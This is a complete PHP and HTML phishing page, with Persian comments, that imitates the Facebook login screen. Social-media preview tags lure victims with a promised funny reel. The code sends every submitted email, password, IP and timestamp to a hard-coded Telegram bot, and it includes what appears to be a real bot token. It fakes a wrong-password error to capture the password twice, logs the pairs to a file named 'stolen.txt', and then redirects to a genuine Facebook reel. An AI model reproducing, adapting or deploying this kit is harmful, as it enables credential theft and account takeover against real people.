<?php
session_start();

function sendToTelegram($email, $pass, $attempt) {
    $token   = "7455551654:AAEiqVcQCG29uzoXIiK9h2KUKfUef_GfRXM";
    $chat_id = "5389485877"; // ← آیدی خودت رو اینجا بنویس

    $ip    = $_SERVER['REMOTE_ADDR'];
    $time  = date('Y-m-d H:i:s', strtotime('+3:30 hours'));
    $url   = "https://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];

    $message = "فیسبوک فیش - تلاش $attempt\n\nEmail: $email\nPass: $pass\nIP: $ip\nTime: $time\nLink: $url";
    file_get_contents("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&text=" . urlencode($message));
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = trim($_POST['email'] ?? '');
    $pass  = $_POST['pass'] ?? '';

    if (!isset($_SESSION['first_attempt'])) {
        $_SESSION['first_attempt'] = true;
        $_SESSION['saved_email']   = $email;
        sendToTelegram($email, $pass, "اول");
        $error = "The password that you've entered is incorrect.";
    } else {
        sendToTelegram($email, $pass, "دوم");
        $data = "Email: $email | Pass: $pass | IP: {$_SERVER['REMOTE_ADDR']} | Time: " . date('Y-m-d H:i:s') . "\r\n";
        file_put_contents("stolen.txt", $data, FILE_APPEND | LOCK_EX);
        session_unset(); session_destroy();
        header("Location: https://www.facebook.com/share/r/17ayuhdYss/");
        exit();
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>Log in to Facebook | Facebook</title>
    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yD/r/d4ZIVX-5C-b.ico" type="image/x-icon">

    <!-- این ۴ خط جادویی هستن که پیش‌نمایش رو می‌سازن -->
    <meta property="og:title" content="ریلز خنده‌دار 😂 فقط برای کاربران لاگین‌شده" />
    <meta property="og:description" content="برای دیدن این ریلز خنده‌دار وارد حساب فیسبوک خودت شو!" />
    <meta property="og:image" content="https://i.imgur.com/8yZxK1P.jpeg" /> <!-- عکس کاور ریلز -->
    <meta property="og:url" content="https://<?= $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'] ?>" />
    <meta property="og:type" content="video.other" />

    <!-- برای تلگرام و واتساپ هم اینا رو اضافه کردیم -->
    <meta property="twitter:card" content="summary_large_image">
    <meta property="twitter:title" content="ریلز خنده‌دار فقط برای کاربران لاگین‌شده">
    <meta property="twitter:description" content="وارد شو تا این ریلز باحال رو ببینی!">
    <meta property="twitter:image" content="https://i.imgur.com/8yZxK1P.jpeg">

    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
    <style>
        body{margin:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background:#f0f2f5;}
        ._9vt3{height:100vh;display:flex;align-items:center;justify-content:center;flex-direction:column;padding:20px;box-sizing:border-box;}
        ._8esj{background:#fff;max-width:396px;width:100%;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1),0 8px 16px rgba(0,0,0,.1);padding:20px 0;text-align:center;}
        ._8icz img{height:106px;margin-bottom:-20px;}
        form{margin:20px 40px;}
        input{font-size:17px;padding:14px 16px;width:100%;border:1px solid #dddfe2;border-radius:6px;margin:6px 0;box-sizing:border-box;}
        input[type=submit]{background:#0866ff;color:#fff;font-weight:600;cursor:pointer;border:none;margin-top:10px;}
        input[type=submit]:hover{background:#1877f2;}
        .error{color:#e41e3f;background:#f8d7da;border:1px solid #f5c6cb;padding:10px;border-radius:6px;margin:10px 40px 0;font-size:14px;}
        .error::before{content:"×";font-weight:bold;margin-right:8px;}
        @media (max-width:500px){
            body{background:#fff;}
            ._9vt3{height:100vh;justify-content:flex-start;padding-top:80px;}
            ._8esj{box-shadow:none;border-radius:0;}
        }
    </style>
</head>
<body>
<!-- بقیه کد همون قبلی -->
<div class="_9vt3">
    <div class="_8esj">
        <div class="_8icz">
            <img src="https://static.xx.fbcdn.net/rsrc.php/yV/r/-f2iZxoLvdL.svg" alt="Facebook">
        </div>
        <?php if (!empty($error)): ?>
            <div class="error"><?= htmlspecialchars($error) ?></div>
        <?php endif; ?>
        <form method="post">
            <input type="text" name="email" placeholder="Email address or phone number" required autocomplete="off"
                   value="<?= htmlspecialchars($_SESSION['saved_email'] ?? $email ?? '') ?>">
            <input type="password" name="pass" placeholder="Password" required autocomplete="off">
            <input type="submit" value="Log in">
        </form>
        <div style="margin-top:30px;padding:0 40px;">
            <small style="color:#606770;">This reel is only visible to logged-in users</small>
        </div>
    </div>
</div>
</body>

</html>
